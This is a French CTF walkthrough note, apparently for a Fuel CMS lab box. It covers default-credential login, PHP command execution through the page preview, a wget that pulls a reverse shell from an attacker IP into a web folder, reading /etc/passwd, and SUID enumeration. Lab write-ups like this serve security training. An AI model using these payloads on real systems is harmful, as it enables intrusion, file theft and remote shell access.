@@ -1,0 +1,87 @@
+nmap:
+	80:
+		http-robots.txt
+		/fuel/
+
+
+Sur le /fuel, on arrive sur une page de login
+J'ai tenté le classique admin:admin et c'est passé
+
+Dans le cms, on peux executer du php dans la preview des pages:
+
+<h1>test<h1>
+<pre style="font-size:10px">
+<?php
+    echo(exec("ls -lah"));
+    echo("\n------------------------------------------------------\n");
+    echo(exec("cat robots.txt"));  
+    echo("\n------------------------------------------------------\n");
+    echo(exec("pwd"));  
+    echo("\n------------------------------------------------------\n");
+    echo(exec("ls -lah /home/www-data"));
+    echo("\n------------------------------------------------------\n");
+    echo(exec("cat /home/www-data/flag.txt"));
+?>
+</pre>
+
+Avec `echo(exec("cat /home/www-data/flag.txt"));` je recupe le premier flag
+
+Pour avoir un reverse shell:
+<h1>test<h1>
+<pre style="font-size:10px">
+<?php
+    echo(shell_exec("ls -lah"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("cat robots.txt"));  
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("pwd"));  
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("ls -lah /home/www-data"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("cat /home/www-data/flag.txt"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("cat /etc/passwd"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("touch test.php"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("ls -lah"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("ls -lah assets/"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("touch assets/test.php"));
+    echo("\n------------------------------------------------------\n");
+    echo(shell_exec("wget -O assets/test.php http://10.9.23.17:8001/php-reverse-shell.php"));
+?>
+</pre>
+
+J'ai recupe le reverse php de pentestmonkey, puis up un server python et recupe
+le fichier grace a WGET et je l'ai mis dans le dossier assets pour y avoir acces 
+via /assets/test.php
+
+
+find / -perm -4000 2>/dev/null
+/usr/sbin/pppd
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/vmware-user-suid-wrapper
+/usr/bin/sudo
+/usr/bin/chfn
+/usr/bin/passwd
+/bin/su
+/bin/ping6
+/bin/ntfs-3g
+/bin/ping
+/bin/mount
+/bin/umount
+/bin/fusermount
+
+Spawn un vrai terminal: /usr/bin/script -qc /bin/bash /dev/null
